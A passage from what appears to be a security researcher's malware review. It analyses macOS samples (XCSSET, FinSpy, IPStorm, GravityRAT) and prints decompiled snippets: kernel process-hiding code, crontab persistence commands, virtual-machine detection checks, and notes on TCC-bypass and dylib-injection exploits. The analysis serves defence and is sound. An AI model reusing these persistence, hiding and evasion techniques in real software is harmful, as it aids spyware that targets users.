notes:](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf)**\n\n_\"This is done so that when the infected user wants to open the normal Safari browser, the fake one will get executed_\n_instead._\n\n_...functionally, this means that the fake Safari browser runs instead of the legitimate version of Safari.\" -TrendMicro_\n\nIt should also be noted that several of the malware’s modules reference launch agent property lists …property lists that are likely related to\nthe malware. For example (as noted by TrendMicro) the remove_old module, “removes …\n```\n~/Library/LaunchAgents/com.apple.core.launchd.plist” while the cleaner module “removes\n~/Library/LaunchAgents/com.apple.core.accountsd.plist”\n\n```\n…thus some versions/variants of the OSX.XCSSET may persist via normal mechanisms (e.g. launch agents).\n\n**Capabilities: Credential Stealing, Data Exfiltration, Ransomware, Viral Replication ...and more!**\n\n\n-----\n\n_\"XCSSET attempts to steal passwords from victims’ Apple ID, Google, Paypal, and other accounts. ...[the malware] also_\n_attempts to exfiltrate data from apps such as Apple Notes, Evernote, Skype, Telegram, and WeChat\" -Intego_\n\nIt should be noted that on recent versions of macOS, malware is are prevented from accessing various user/system files, unless the user\nhas manually granted the application “Full Disk Access” (via the System Preferences application).\n\nTo work around this privacy mechanism, OSX.XCSSET leverages (what were) two 0day exploits:\n\npatrick wardle @patrickwardle [· Aug 13, 2020](https://twitter.com/patrickwardle/status/1294166216399978498?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294167251008942081%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\nKinda stoked macOS malware is stepping up its game\n\n[New from @TrendMicro, details on OSX.XCSSET:](https://twitter.com/TrendMicro?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294167251008942081%7Ctwgr%5E%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n\"Mac Malware: Infects Xcode Projects, Performs UXSS Attack on\nSafari...Leverages [Two!] Zero-day Exploits\":\n[blog.trendmicro.com/trendlabs-secu…](https://t.co/CU46aNfRWV?amp=1)\n\n[Technical Details: documents.trendmicro.com/assets/pdf/XCS…](https://t.co/xqABTeusUV?amp=1)\n\npatrick wardle\n@patrickwardle\n\n##### Exploit 0x1: ...bypass Full Disk Access via SSHD to access (protected) Safari cookies\n\n[9:01 PM · Aug 13, 2020](https://twitter.com/patrickwardle/status/1294167251008942081?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294167251008942081%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n16 [See patrick wardle’s other Tweets](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294167251008942081%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\nThe first vulnerability (implemented in the malware’s safari_cookie module) abuses the fact that Full Disk Access is granted to the\n```\nssh service. The malware simply (ab)uses scp to “connect” to the system it’s running on (username@localhost) and copy protected\n\n```\nfiles (e.g. Safari’s binary cookie file).\n\n```\nFor more details on this exploit, see\n               \"The vulnerability in Remote Login (ssh) persists\".\n\n```\n\nThe second vulnerability involves leverages SafariForWebKitDevelopment:\n\n\n-----\n\nExploit 0x2:\n(ab)use SafariForWebKitDevelopment \"to perform malicious\noperations w/o user approval\"\n\npatrick wardle\n@patrickwardle\n\n##### Also, Dylib Hijacking!?\n\n[9:05 PM · Aug 13, 2020](https://twitter.com/patrickwardle/status/1294168301510119425?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294168301510119425%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n16 [See patrick wardle’s other Tweets](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1294168301510119425%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n\n[As noted in a Jamf writeup on the malware:](https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/)\n\n_\"The second exploit leverages a developer specific tool. If the device doesn’t already have the SafariForWebKitDevelopment_\n_component installed, the malware goes and downloads it. With this, it can utilize Safari’s extensive capabilities without being_\n_hindered by the usual sandbox.\" -Jamf_\n\n…in order to gain code execution within the context of Apple’s SafariForWebKitDevelopment binary, the malware (ab)uses the\n```\nDYLD_FRAMEWORK_PATH and DYLD_LIBRARY_PATH environment variables:\n\n```\nOSX.XCSSET's dylib injection (credit: TrendMicro)\n\n\n-----\n\nThe combination of these two exploits is rather potent, and allows OSX.XCSSet perform its credential stealing and data exfiltration\nactions quite effectively:\n\n_\"XCSSet effectively has all the tools it needs to run arbitrary code and touch every file on the system, neatly sidestepping_\n_the strong defenses in macOS.\" -Jamf_\n\n```\nAnd what if the user doesn’t have Safari? Well as Intego notes:\n“And just in case the victim doesn’t use Safari, XCSSET also has the capability of installing\nTrojanized versions of many other Mac browsers: Google Chrome, Mozilla Firefox, Microsoft Edge,\nBrave, Opera, 360 (a Chinese browser), and Yandex (a Russian browser).”\n\n```\n\nBesides credential / data stealing, OSX.XCSSET supports a myriad of other capabilities (implemented via payload modules). The\n[TrendMicro report summarizes the plugins (and their capabilities). Some notable plugins, mentioned in the report include:](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf)\n```\n  screen:\n\n```\nTakes screenshots of an infected system.\n```\n  encrypter:\n\n```\nEncrypts (ransoms) users files (via AES in CBC mode).\n```\n  replicator:\n\n```\nInfects local Xcode projects with its malicious code.\n```\n OSX.FinSpy\n FinSpy is commercial cross-platform implant, supporting a myriad of cyber espionage features &\n capabilities.\n  Download: OSX.FinSpy (password: infect3d)\n\n```\n[The malware was discovered by Amnesty International, as seen in the tweet by Claudio Guarnieri, their “Head of Security Lab”:](https://twitter.com/botherder)\n\n\n-----\n\n##### Sometimes threat intel is hard, sometimes folks leave all FinFisher samples exposed on a webserver. So here ya go, along with recent Windows and Android, we're publishing details on new FinFisher for Mac OS  and Linux .\n\nGerman-made FinSpy spyware found in Egypt, and Mac and Linux versions …\n\n - FinSpy is a commercial spyware suite produced by the Munich-based\ncompany FinFisher Gmbh. Since 2011 researchers have documented …\n\namnesty.org\n\n[1:08 AM · Sep 25, 2020](https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1309449600110129152%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n382 [274 people are Tweeting about this](https://twitter.com/botherder/status/1309449600110129152?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1309449600110129152%7Ctwgr%5E%7Ctwcon%5Es1_&ref_url=https%3A%2F%2Fobjective-see.com%2Fblog%2Fblog_0x5F.html)\n\n\n[Titled, “German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed,” the Amnesty International writeup](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\ndetailed FinFisher’s spyware suite (FinSpy), including “previously undisclosed versions for Linux and MacOS computers”\n\nAs noted in their report:\n\n_\"FinSpy is a commercial spyware suite produced by the Munich-based company FinFisher Gmbh. Since 2011 researchers_\n_have documented numerous cases of targeting of Human Rights Defenders (HRDs) - including activists, journalists, and_\n_dissidents with the use of FinSpy in many countries, including Bahrain, Ethiopia, UAE, and more.\"_\n\n**Writeups:**\n\n**[“FinFisher Filleted](https://objective-see.com/blog/blog_0x4F.html)** **”**\n\n**[“The Finfisher Tales, Chapter 1: The dropper”](https://reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/)**\n\n**[“German-made FinSpy spyware found in Egypt, and Mac and Linux versions revealed”](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)**\n\n**Infection Vector: Unknown**\n\nAmnesty International uncovered “a server located at the IP address 158.69.105[.]207” …hosting various FinSpy samples, including a\nmacOS variant:\n\n\n-----\n\nFinSpy Server (credit: Amnesty International)\n\nUnfortunately there was no clear indication how (macOS) targets were infected.\n\n```\nCommercial spyware is often sold to customers, who are then responsible for figuring out how to\ndeploy the software to (read: infect) targets of interest.\nSuch customers may (separately) purchase exploits, or craft their own social engineering campaigns to\ncompromise their targets.\n\n```\n\nHowever, we should note that the malware was distributed as disk image, containing a single item: an application bundle named Install\n```\nÇağlayan:\n\n```\n\n-----\n\n/Volumes/caglayan-macos/Install Çağlayan.app\n\n…with a bundle identifier of com.coverpage.bluedome.caglayan.desktop.installer:\n\n\n##### $ cat \"/Volumes/caglayan-macos/Install Çağlayan.app/Contents/Info.plist\"\n\n <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\">   <dict>\n     <key>CFBundleExecutable</key>     <string>Install Çağlayan</string>\n     <key>CFBundleIdentifier</key>     <string>com.coverpage.bluedome.caglayan.desktop.installer</string>     ...   </dict> </plist>\n\n\nThis may indicate that the malware was distributed as a trojanized application or perhaps was attempting to masquerade as a legitimate\napplication (perhaps for the Turkish news(?) site, Çağlayan (caglayandergisi.com)).\n\n**Persistence: Launch Agent**\n\nIf the malicious application (Install Çağlayan.app) is run, it will eventually execute an installer (that was copied to\n```\n~/Library/Caches/org.logind.ctp.archive/installer).\n\n```\n[As noted in the Amnesty writeup, this installer performs three actions:](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n1. Copies plugins and config files to /Library/Frameworks/Storage.framework.\n2. Copies the launcher (logind) to /private/etc/logind.\n3. Persists the launcher, by creating a launch agent plist: /System/Library/LaunchAgents/logind.pslist.\n\nLet’s take a closer look at it now, to highlight the code responsible for these actions.\n\nThe org.logind.ctp.archive/installer is a Mach-O binary, rather similar (albeit simpler) than its parent,\n```\n.log/ARA0848.app/Contents/MacOS/installer. (For example, both contain a custom GIFileOps class that implements\n\n```\nvarious file related methods (copy: to:, loadAgent, etc.).\n\nThis (next stage) installer’s main method starts at 0x000000010a3d95ac. The logic the the main function first checks for the presence\nof various files (plugins?), such as /Library/Frameworks/Storage.framework,\n```\n/Contents/Resources/7f.bundle/Contents/Resources/AAC.dat. It then builds a dictionary of key-value pairs via a call\n\n```\nto [GIPath installationMap]:\n\n\n-----\n\n##### ...\n * thread #1, queue = 'com.apple.main-thread' installer`main: -> 0x10a3da37e <+3538>: callq *0x6d04(%rip) ;objc_msgSend\n\n (lldb) x/s $rsi 0x10a3df5c7: \"installationMap\"\n\n (lldb) ni\n\n (lldb) po $rax {   \"/Users/user/Library/Caches/org.logind.ctp.archive/Storage.framework\"\n```\n   → \"/Library/Frameworks/Storage.framework\";\n\n   \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n   → \"/private/etc/logind\";\n\n   \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"\n   → \"/System/Library/Extensions/logind.kext\";\n   \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"\n   → \"/Library/LaunchAgents/logind.plist\";\n }\n\n```\n\nAs we can see in the debugger output, this maps files from the decrypted uncompressed archive (org.logind.ctp.archive) to their\nfinal destinations.\n\nThe installer then iterates over each of these files, and via a block (at 0x000000010a3da4d2) moves them from the archive to their (final)\ndestinations:\n\n```\n1 files = [GIPath installationMap];\n2 [files enumerateKeysAndObjectsUsingBlock:(void (^)(KeyType src, ObjectType dest, BOOL\n*stop))\n3 {\n4\n5  [GIFileOps move:src to:dest];\n6  [GIFileOps setStandardAttributes:dest];\n7\n8 }];\n\n```\n\nWe can passively observe this via our **[File Monitor:](https://objective-see.com/products/utilities.html#FileMonitor)**\n\n\n##### # FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter installer {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",  \"file\" : {   \"destination\" : \"/Library/LaunchAgents/logind.plist\",   \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"  } }\n\n {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",  \"file\" : {   \"destination\" : \"/private/etc/logind\",   \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n }\n\n\n-----\n\n##### {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",  \"file\" : {   \"destination\" : \"/System/Library/Extensions/logind.kext\",   \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"  } }\n\n {  \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",  \"file\" : {   \"destination\" : \"/Library/Frameworks/Storage.framework\",   \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/storage.framework\"  } }\n\n\nLet’s take a closer look at the logind.plist:\n\n\n##### $ cat /Library/LaunchAgents/logind.plist\n\n <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"> <plist version=\"1.0\"> <dict>     <key>Label</key>     <string>org.logind</string>     <key>ProgramArguments</key>     <array>         <string>/private/etc/logind</string>     </array>     <key>RunAtLoad</key>     <true/>     <key>KeepAlive</key>     <dict>         <key>SuccessfulExit</key>         <false/>     </dict> </dict> </plist>\n\n\nAs the RunAtLoad key is set to true, the binary, /private/etc/logind will be automatically (re)executed each time the system is\nrebooted an the user logs in.\n\nOnce the installer has, well, installed (and setuid’d) these various components, it kicks off this persistent launch agent via a call to\n```\n[GIFileOps loadAgent:]\n\n```\nThis method simply invokes launchctl with the load command line argument, and path to the logind.plist to:\n\n```\n 1 +(char)loadAgent:(char *)plist {\n 2\n 3   task = [[NSTask alloc] init];\n 4   [task setLaunchPath:@\"/bin/launchctl\"];\n 5   args = [NSArray arrayWithObjects:@\"load\", plist, 0x0];\n 6   [r15 setArguments:args];\n 7\n 8   [task launch];\n 9 [task waitUntilExit];\n\n```\n\n-----\n\nThe persistent implant (/private/etc/logind), is now off and running!\n\n**Capabilities: Persistent Implant with plugin-based modules and a kernel-level rootkit**\n\n[Amnesty’s writeup details the capabilities of FinSpy, noting such capabilities are implemented via plugins:](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\n_\"FinSpy for Mac OS ...follow(s) a modular design. The launcher `logind` only instantiates the core component `dataPkg`,_\n_which oversees communications with the Command and Control server (C&C), and decrypting/launching modules when_\n_needed. The modules are encrypted with the AES algorithm and compressed with the `aplib` compression library. The AES_\n_key is stored in the binary, but the IV is stored in each configuration file along with a MD5 hash of the final decompressed_\n_file.\"_\n\nThe rather extensive list of modules available to the spyware include:\n\nAnother interesting capability of this malware is its kernel-mode rootkit functionality. Simply put, (public) macOS malware with ring-0\ncapabilities is rare!\n\nThe file logind.kext is FinSpy’s kernel extension …though it is unsigned:\n\n\n##### $ codesign -dvv org.logind.ctp.archive/logind.kext/Contents/MacOS/logind logind.kext/Contents/MacOS/logind: code object is not signed at all\n\n```\nAs the kernel extension is unsigned, it won’t run on any recent version of macOS (which enforce kext\ncode signing requirements).\n\n```\n\nIt terms of it’s functionality, it appears to be a simple process hider.\n\nIn a function named ph_init, the kernel extension looks up a bunch of kernel symbols (via a function named\n```\nksym_resolve_symbol_by_crc32):\n\n```\n```\n 1 void ph_init() {\n 2\n 3   rax = ksym_resolve_symbol_by_crc32(0x127a88e8, rsi, rdx, rcx);\n\n```\n\n-----\n\n```\n 8   rax = ksym_resolve_symbol_by_crc32(0xfffffffffef1d247, rsi, rdx, rcx);\n 9 *_LCK_LCK = rax;\n10 if (rax != 0x0)\n11 *_LCK_LCK = *rax;\n12\n13   ...\n14\n15   rax = ksym_resolve_symbol_by_crc32(0x392ec7ae, rsi, rdx, rcx);\n16 *_LCK_MTX_LOCK = rax;\n17 if (rax != 0x0)\n18 *_LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c, rsi, rdx, rcx);\n19\n20\n21 return;\n22 }\n\n```\n\nBased on variable names, it appears that logind.kext is attempting to resolve the pointer of the kernel’s global list of proc (process)\nstructures, as well as various locks.\n\nIn a function named ph_hide the kext will hide a process. This is done by walking the list of proc structures (pointed to by\n```\n_ALLPROC_ADDRESS), and looking for the one that matches (to hide):\n\n```\n```\n 1 void _ph_hide(int arg0) {\n 2\n 3   r14 = arg0;\n 4 if (r14 == 0x0) return;\n 5\n 6   r15 = *_ALLPROC_ADDRESS;\n 7 if (r15 == 0x0) goto return;\n 8\n 9 SEARCH:\n10\n11   rax = proc_pid(r15);\n12   rbx = *r15;\n13 if (rax == r14) goto HIDE;\n14\n15 loc_15da:\n16   r15 = rbx;\n17 if (rbx != 0x0) goto SEARCH;\n18\n19 return;\n20\n21 HIDE:\n22   r14 = *(r15 + 0x8);\n23   (*_LCK_MTX_LOCK)(*_LCK_LCK);\n24 *r14 = rbx;\n25 *(rbx + 0x8) = r14;\n26   (*_LCK_MTX_UNLOCK)(*_LCK_LCK);\n27 return;\n28 }\n\n```\n\nIn the above code, note that HIDE contains the logic to remove the target process of interest, by unlinking it from the (process) list. Once\nremoved, the process is now (relatively) “hidden”. (Of course one can leverage XNU level APIs to uncover such process hiding).\n\nThe malicious kext also appears to be able to communicate with user-mode via the file /tmp/launchd-935.U3xqZw. Specifically, in a\nfunction named ksym_init, it will open and read in the contents of this file (which may contain details of the process to hide?):\n\n```\n 1 void ksym_init(int arg0, int arg1) {\n 2 *(int32_t *)_MKI_SIZE = fileio_get_file_size(\"/tmp/launchd-935.U3xqZw\", arg1);\n 3   rax = _OSMalloc_Tagalloc(\"MKI\", 0x0);\n 4 *_MKI_TAG = rax;\n 5 if ( 0 0) l1\n\n```\n\n-----\n\n```\n        _ _ _ _\n 9 *_MKI_BUFFER = rax;\n10 if (rax == 0x0) goto loc_1921;\n11\n12 loc_18b2:\n13 if (fileio_read_file_fully(\"/tmp/launchd-935.U3xqZw\", rax) == 0x0) goto loc_1908;\n14\n15   ....\n16 }\n\n```\n```\n IPStorm\n IPStorm is a cross platform botnet, now ported to macOS. Though it’s capabilities are limited on\n macOS, it support a reverse shell, ad faud, and more.\n  Download: IPStorm (password: infect3d)\n\n```\n[In early October researchers a Intezer published a report about IPStorm being ported from Windows to Linux…and also macOS:](https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/)\n\n_\"Our research team recently identified new Linux variants of IPStorm targeting various Linux architectures (ARM, AMD64,_\n_Intel 80386) and platforms (servers, Android, IoT). We have also detected a macOS variant.\" -Intezer_\n\nThe macOS version of IPStorm is packed with the UPX packer. Luckily we can use UPX itself (via the -d flag) to completely unpack the\nmalware:\n\n\n##### $ ./upx -d IPStorm             Ultimate Packer for eXecutables              Copyright (C) 1996 - 2013 UPX 3.09    Markus Oberhumer, Laszlo Molnar & John Reiser  Feb 18th 2013\n\n With LZMA support, Compiled by Mounir IDRASSI (mounir@idrix.fr)\n\n     File size     Ratio   Format   Name  --------------------  ------  -----------  -----------  20172924 <-  8216592  40.73%  Mach/AMD64  IPStorm\n\n Unpacked 1 file.\n\n\n…once unpacked, analysis can commence.\n\n**Writeups:**\n\n**[“A Storm is Brewing: IPStorm Now Has Linux Malware”](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)**\n\n**[“GravityRAT and IPStorm: Mac Malware, Ported from Windows”](https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/)**\n\n\n-----\n\n[It is not clear how IPStorm infects macOS systems. However, the Intezer report notes that the malware can spread via SSH brute-](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)\nforcing:\n\n_\"The [malware] attempts to spread and infect other victims on the internet by using SSH brute-force. Once a connection is_\n_established ...it will proceed to download the payload and infect the server.\" -Intezer_\n\nAt address 00000000046e70b0 we find a function named storm/scan_tools/ssh.brute …that if successfully brute-forces a\nSSH connection on a remote system will call storm/scan_tools/ssh.InstallPayload. This function will ascertain the\narchitecture of the (newly) accessed system (via a call to storm/scan_tools/ssh.SystemInfo.GoArch), and the proceeds to\ndownload the appropriate payload (via storm/statik.GetFileContents).\n\nOnce the payload has been downloaded to the remote system, IPStorm invokes a function named ssh.(*Session).Start …\nwhich eventually calls runtime.newproc to (likely) kick off the payload on th remote system.\n\n```\n1 int ssh.InstallPayload(...) {\n2\n3  ssh.SystemInfo.GoArch(...);\n4\n5  statik.GetFileContents(...);\n6\n7  ssh.(*Session).Start(...);\n8\n9 }\n\n```\n\n**Persistence: None(?)**\n\nWhile the Windows and Linux versions of IPStorm will persist, it does not appear that the macOS version supports persistence.\n\nThe Intezer **[report details a function in the Linux variant, filetransfer.(*File).Persist that, “archives persistence”.](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)**\n\nWe find this same function in the macOS version (at address 0x004491620) …however it does not appear to contain any persistence\nlogic, but instead references the string \"Persist not implemented on platform %s\":\n\n```\n1 ;filetransfer.(*File).Persist\n2 ...\n3 lea  rax, qword [0x4910358] ;\"Persist not implemented on platform %s\"\n\n```\n\nMoreover executing the malware (in a virtual machine) does not generate any persistent events.\n\n**Capabilities: Remote Shell, Ad Faud, etc...**\n\nDuring their analysis of the Linux variant, the Intezer researchers **[noted that IPStorm would create a reverse shell via functions named](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)**\n```\nbackshell.*.\n\n```\nWe find these same functions in the macOS variant:\n\n\n-----\n\nbackshell.* functions\n\nTaking a peek at the backshell.openLocalShell function reveals it invoking powershell.(*Backend).StartProcess …\npassing in bash\n\n```\n1 int storm/backshell.openLocalShell(...) {\n2   ...\n3\n4 //0x48ed0be -> \"bash\"\n5   storm/powershell.(*Backend).StartProcess(..., 0x48ed0be, ...);\n6\n7 }\n\n```\n\n[Looking at sockets on an infected system (via our tool Netiquette), we find that the malware has created a listening socket on a high port:](https://objective-see.com/products/netiquette.html)\n\n\n-----\n\nListening Socket\n\n…this might indicate that the malware creates a listener socket in process to facilitate the reverse shell (and perhaps passes the commands\nthen to bash to execute).\n\n[In the Intezer report, the researches noted that the Linux version of IPStorm also engages in fraudulent activities:](https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/)\n\n_\"IPStorm’s Linux variant takes advantage of its being widespread to perform different fraudulent activity in the background,_\n_abusing gaming and ads monetization. Because it’s a botnet, the malware utilizes the large amount of requests from different_\n_trusted sources, thus not being blocked nor traceable.\" -Intezer_\n\nBy sniffing network traffic we can confirm that the macOS variant also engages in such activities …specifically fraudulent ad monetization:\n\nFraudulent Ad Monetization\n\n…to a large number of remote IP addresses (though some may be other members of the botnet, or SSH brute-force attempts):\n\n\n-----\n\nSo ... Many ... Connections\n```\n GravityRat\n GravityRat is cross-platform remote administration tool (RAT …backdoor) now ported to macOS. The\n (available) samples, are persistent first-stage downloaders.\n  Download: GravityRAT (password: infect3d)\n\n```\n[In October, Kaspersky published a new report on the intriguing cross-platform spyware, GravityRAT (\"used to target the Indian armed](https://securelist.com/gravityrat-the-spy-returns/99097/)\n_forces\"). In this report, they noted that for the first time, “there are now versions for …macOS”._\n\nThe Kaspersky repprt mentioned several samples (of trojanized applications) that were all persistent first-stage downloaders.\n\n\n##### $ shasum OSX.GravityRAT/* 086b22075d464b327a2bcbf8b66736560a215347 ~/OSX.GravityRAT/Enigma 696c7cbba2c9326298f3ddca5f22cfb20a4cd3ee ~/OSX.GravityRAT/OrangeVault e33894042f3798516967471d0ce1e92d10dec756 ~/OSX.GravityRAT/StrongBox 9b5b234e3b53f254bc9b3717232d1030e340c7f2 ~/OSX.GravityRAT/TeraSpace\n\n\n…here, we’ll focus mainly on the Enigma sample (086b22075d464b327a2bcbf8b66736560a215347) and StrongBox sample\n(e33894042f3798516967471d0ce1e92d10dec756).\n\n**Writeups:**\n\n**[“GravityRAT: The spy returns”](https://securelist.com/gravityrat-the-spy-returns/99097/)**\n\n\n-----\n\n**Infection Vector: Trojanized Applications**\n\nKaspersky’s **[report notes that (at least one sample of) the Windows versions was “downloaded from the site enigma.net[.]in under the guise](https://securelist.com/gravityrat-the-spy-returns/99097/)**\n_of a secure file sharing app to protect against ransomware”. The macOS version (Enigma) also appears to masquerade as such an_\napplication:\n\nEnigma's user interface\n\nIt’s unknown how the user is coerced into downloading and running the trojaned application, but it they do - they may end up infected.\n\n…may, as the sample(s) are unsigned:\n\n\n##### $ for i in OSX.GravityRAT/*; do codesign -dvvv $i; done OSX.GravityRAT/Enigma: code object is not signed at all OSX.GravityRAT/OrangeVault: code object is not signed at all OSX.GravityRAT/StrongBox: code object is not signed at all OSX.GravityRAT/TeraSpace: code object is not signed at all\n\n\n…meaning that on recent version of macOS (Gatekeeper) will block them (unless the user manually removes the quarantine attribute, or if\ndistirbuted in a .pkg, clicks through various warnings).\n\n**Persistence: Cron Job (of a 2[nd]-stage payload)**\n\nThe samples themselves, don’t appear to persist. However, (2[nd]-stage) payloads that are downloaded, are persisted (by the malware).\n\nThe Kaspersky **[report, notes, “The Mac version …adds a cron job”](https://securelist.com/gravityrat-the-spy-returns/99097/)**\n\nFor the Enigma sample, we find this persistence logic in a function named format:\n\n\n-----\n\n```\n 3 if not os.path.isfile(des):\n 4    os.system('cp ' + src + ' ' + des)\n 5 if des[-3:] == '.py':\n 6    os.system('sudo crontab -l 2>/dev/null;\n 7         echo \"*/2 * * * * python ' + des + '\" | sudo crontab -')\n 8 else:\n 9    os.chmod(des, 448)\n10    des += ' ' + uc\n11    os.system('sudo crontab -l 2>/dev/null;\n12         echo \"*/2 * * * * ' + des + '\" | sudo crontab -')\n13 return '+O '\n\n```\n\nVia crontab the malware persists a downloaded file (a 2nd-stage payload), as a cron job. This malicious cron job is set to run every two\nminutes (*/2 * * * *).\n\nThe StrongBox sample also persists a downloaded file, via a function scheduleMac to persist and launch the downloaded payload.\nThe scheduleMac function persists the downloaded payload as cron job, via the builtin crontab command:\n```\n  1 function scheduleMac(fname,agentTask)\n  2 {\n  3  ...                            \n  4 var poshellMac = loclpth+\"/\"+fname;\n  5 execTask('chmod -R 0700 ' + \"\\\"\" + + \"\\\"\" );                       \n  6\n  7  ...\n  8 arg = agentTask;\n  9 execTask('crontab -l 2>/dev/null;\n 10       echo \\' */2 * * * * ' + \"\\\"\" +poshellMac + \"\\\" \" + arg + '\\'\n 11       | crontab -', puts22); \n 12 }\n\n```\n…the persisted payload, will be (re)launched every two minutes (*/2 * * * * ).\n\n**Capabilities: 1[st]-stage downloader**\n\nThe macOS GravityRat samples appear to simply be 1[st]-stage downloaders …as the reach out to a remote command & control servers to\ndownload (and persist) 2[nd]-stage payloads.\n\nBefore downloading and persisting the next stage payloads though, the malware performs several checks (implemented in the the\n```\nmain.js file):\n\n```\nCheck if running in a VM\nCheck if not connected to the Internet\nCheck if not running with Full Disk Access (FDA)\n\nLet’s take a closer look at each of these.\n\nThe aptly named function, VMCheck, checks if the application is running within a Virtual Machine. Virtual machine checks are commonly\nfound in malware, in an attempt to ascertain if a malware analyst is (likely) examining the code (in a virtual machine).\n\n```\n 1 function VMCheck(stdout) {\n 2\n 3 if (stdout.includes(\"innotek GmbH\") ||\n 4 stdout.includes(\"VirtualBox\") ||\n 5 stdout.includes(\"VMware\") ||\n 6 stdout.includes(\"Microsoft Corporation\" ||\n 7 stdout.includes(\"HITACHI\"))) {\n 8\n 9 axios.post(srdr, {\n10 value: 'vm',\n11 status: true\n12 })\n\n```\n\n-----\n\n```\n16 const options = {\n17 type: 'question',\n18 buttons: ['Ok'],\n19 defaultId: 2,\n20 title: 'StrongBOX - Operation Not Permitted in VirtualBOX',\n21 message: 'Action Required',\n22 detail: 'StrongBOX - Unable to load components\\n\n23       Please exit virtual mode to launch the application.'\n24  };\n25\n26 dialog.showMessageBox(null, options, (response, checkboxChecked) => {\n27 app.quit();\n28 app.exit();\n29  });\n\n```\n\n…pretty easy to see its checking if the passed in parameter (stdout) contains strings related to popular virtual machine products (e.g.\n```\nVMware). So what’s in the stdout parameter? Well, if the malware is running on a macOS system, the VMCheck function will be invoked\n\n```\nfrom within a function named Vmm:\n\n```\n1 function Vmm() {\n2 var modname = exec(\"system_profiler SPHardwareDataType | grep 'Model Name'\");\n3 var smc = exec(\"system_profiler SPHardwareDataType | grep 'SMC'\");\n4 var modid = exec(\"system_profiler SPHardwareDataType | grep 'Model Identifier'\");\n5 var rom = exec(\"system_profiler SPHardwareDataType | grep 'ROM'\");\n6 var snum = exec(\"system_profiler SPHardwareDataType | grep 'Serial Number'\");\n7 VMCheck(modname + smc + modid + rom + snum);\n8 }\n\n```\n\nThe Vmm function gets the system identifying information such as the model name, model identifier, serial number and more. If executed\nwithin a virtual machine, this information will contain VM-related strings:\n\n\n##### $ system_profiler SPHardwareDataType | grep 'Model Identifier'  Model Identifier: VMware7,1\n\n $ system_profiler SPHardwareDataType | grep 'ROM'    Boot ROM Version: VMW71.00V.16221537.B64.2005150253    Apple ROM Info: [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]    Welcome to the Virtual Machine\n\n\n…thus the malware will be able to detect it’s running within a virtual machine …and display an error message\n\n```\n 